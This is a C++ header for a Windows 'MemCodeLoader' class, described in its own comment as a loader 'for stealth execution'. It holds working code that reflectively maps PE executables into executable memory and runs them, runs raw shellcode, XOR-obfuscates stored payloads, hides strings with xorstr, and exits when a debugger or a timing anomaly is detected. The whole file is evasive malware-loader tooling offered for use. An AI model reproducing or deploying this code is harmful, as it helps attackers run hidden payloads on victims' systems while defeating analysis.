#pragma once
#include <Windows.h>
#include <vector>
#include <memory>
#include <iostream>
#include "../memloader/memloader-main/memloader/load.hpp"
#include "../xorstr.hpp"

// Memory code loader for stealth execution
class MemCodeLoader {
private:
    // Obfuscated PE data storage
    struct ObfuscatedPE {
        std::vector<uint8_t> data;
        size_t size;
        uint32_t checksum;
        
        ObfuscatedPE(const uint8_t* peData, size_t peSize) : size(peSize) {
            data.resize(peSize);
            
            // Simple XOR obfuscation
            uint8_t key = 0xCC;
            for (size_t i = 0; i < peSize; ++i) {
                data[i] = peData[i] ^ key;
                key = (key + 1) % 256; // Rotating key
            }
            
            // Calculate checksum
            checksum = CalculateChecksum();
        }
        
        std::vector<uint8_t> Decrypt() const {
            std::vector<uint8_t> decrypted(size);
            uint8_t key = 0xCC;
            
            for (size_t i = 0; i < size; ++i) {
                decrypted[i] = data[i] ^ key;
                key = (key + 1) % 256;
            }
            
            return decrypted;
        }
        
        uint32_t CalculateChecksum() const {
            uint32_t sum = 0;
            for (const auto& byte : data) {
                sum += byte;
            }
            return sum;
        }
        
        bool IsValid() const {
            return CalculateChecksum() == checksum;
        }
    };
    
    std::vector<ObfuscatedPE> loadedModules;
    
    // Anti-analysis techniques
    void AntiDebugCheck() {
        // Simple anti-debugging check
        if (IsDebuggerPresent()) {
            ExitProcess(0);
        }
        
        // Timing check
        DWORD start = GetTickCount();
        Sleep(1);
        DWORD end = GetTickCount();
        if (end - start > 10) { // Suspicious delay
            ExitProcess(0);
        }
    }
    
    // Memory protection for loaded code
    bool ProtectMemory(void* address, size_t size, DWORD protection) {
        DWORD oldProtect;
        return VirtualProtect(address, size, protection, &oldProtect);
    }
    
    // Custom PE loader based on memloader
    bool LoadPEFromMemory(const uint8_t* peData, size_t peSize) {
        __try {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peData;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(peData + dos->e_lfanew);
            if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

            SIZE_T size = nt->OptionalHeader.SizeOfImage;
            BYTE* mem = (BYTE*)VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (!mem) return false;

            memcpy(mem, peData, nt->OptionalHeader.SizeOfHeaders);

            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
            for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
                if (sec->SizeOfRawData) {
                    memcpy(mem + sec->VirtualAddress, peData + sec->PointerToRawData, sec->SizeOfRawData);
                }
            }

            // Handle relocations
            ULONG_PTR delta = (ULONG_PTR)(mem - nt->OptionalHeader.ImageBase);
            if (delta && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
                PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(mem +
                    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
                SIZE_T processed = 0;
                while (processed < nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
                    DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                    WORD* list = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
                    for (DWORD i = 0; i < count; i++) {
                        WORD type_offset = list[i];
                        WORD type = type_offset >> 12;
                        WORD offset = type_offset & 0xFFF;
                        BYTE* addr = mem + reloc->VirtualAddress + offset;

                        if (type == IMAGE_REL_BASED_HIGHLOW)
                            *(DWORD*)addr += (DWORD)delta;
                        else if (type == IMAGE_REL_BASED_DIR64)
                            *(ULONGLONG*)addr += delta;
                    }
                    processed += reloc->SizeOfBlock;
                    reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
                }
            }

            // Handle imports
            if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
                PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(mem +
                    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
                while (imp->Name) {
                    char* modName = (char*)(mem + imp->Name);
                    HMODULE lib = LoadLibraryA(modName);
                    if (!lib) return false;

                    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(mem + imp->FirstThunk);
                    PIMAGE_THUNK_DATA orig = imp->OriginalFirstThunk ?
                        (PIMAGE_THUNK_DATA)(mem + imp->OriginalFirstThunk) : thunk;

                    while (orig->u1.AddressOfData) {
                        FARPROC proc = nullptr;
                        if (orig->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                            proc = GetProcAddress(lib, (LPCSTR)(orig->u1.Ordinal & 0xFFFF));
                        } else {
                            PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(mem + orig->u1.AddressOfData);
                            proc = GetProcAddress(lib, name->Name);
                        }

                        if (!proc) return false;
                        thunk->u1.Function = (ULONGLONG)proc;

                        ++thunk;
                        ++orig;
                    }
                    ++imp;
                }
            }

            FlushInstructionCache(GetCurrentProcess(), mem, size);

            // Execute entry point in separate thread
            DWORD epRVA = nt->OptionalHeader.AddressOfEntryPoint;
            void (*entry)() = (void(*)())(mem + epRVA);
            
            HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)entry, nullptr, 0, nullptr);
            if (hThread) {
                WaitForSingleObject(hThread, INFINITE);
                CloseHandle(hThread);
            }

            VirtualFree(mem, 0, MEM_RELEASE);
            return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }
    
public:
    MemCodeLoader() {
        AntiDebugCheck();
    }
    
    // Load PE from memory
    bool LoadFromMemory(const uint8_t* peData, size_t peSize, const std::string& moduleName = "") {
        try {
            AntiDebugCheck();
            
            // Store obfuscated copy
            ObfuscatedPE obfPE(peData, peSize);
            if (!obfPE.IsValid()) {
                std::cout << xorstr_("[-] Invalid PE data") << std::endl;
                return false;
            }
            
            // Decrypt for loading
            auto decrypted = obfPE.Decrypt();
            
            // Use memloader to load the PE
            if (LoadPEFromMemory(decrypted.data(), decrypted.size())) {
                loadedModules.push_back(std::move(obfPE));
                std::cout << xorstr_("[+] Module loaded from memory: ") << moduleName << std::endl;
                return true;
            }
            
            std::cout << xorstr_("[-] Failed to load module: ") << moduleName << std::endl;
            return false;
        }
        catch (const std::exception& e) {
            std::cout << xorstr_("[-] Exception loading module: ") << e.what() << std::endl;
            return false;
        }
    }
    
    // Load embedded module (compile-time embedded)
    template<size_t N>
    bool LoadEmbeddedModule(const uint8_t (&embeddedData)[N], const std::string& moduleName) {
        return LoadFromMemory(embeddedData, N, moduleName);
    }
    
    // Execute shellcode from memory
    bool ExecuteShellcode(const uint8_t* shellcode, size_t size) {
        try {
            AntiDebugCheck();
            
            // Allocate executable memory
            void* execMem = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!execMem) {
                std::cout << xorstr_("[-] Failed to allocate executable memory") << std::endl;
                return false;
            }
            
            // Copy shellcode
            memcpy(execMem, shellcode, size);
            
            // Change protection to execute-only
            if (!ProtectMemory(execMem, size, PAGE_EXECUTE_READ)) {
                VirtualFree(execMem, 0, MEM_RELEASE);
                return false;
            }
            
            // Execute in separate thread
            HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)execMem, nullptr, 0, nullptr);
            if (hThread) {
                WaitForSingleObject(hThread, INFINITE);
                CloseHandle(hThread);
            }
            
            // Clean up
            VirtualFree(execMem, 0, MEM_RELEASE);
            return true;
        }
        catch (const std::exception& e) {
            std::cout << xorstr_("[-] Exception executing shellcode: ") << e.what() << std::endl;
            return false;
        }
    }
    
    // Get number of loaded modules
    size_t GetLoadedModuleCount() const {
        return loadedModules.size();
    }
    
    // Clear all loaded modules
    void ClearModules() {
        loadedModules.clear();
    }
    
    // Integrity check for loaded modules
    bool VerifyIntegrity() {
        for (const auto& module : loadedModules) {
            if (!module.IsValid()) {
                std::cout << xorstr_("[-] Module integrity check failed") << std::endl;
                return false;
            }
        }
        return true;
    }
};

// Global memcode loader instance
extern std::unique_ptr<MemCodeLoader> g_MemCodeLoader;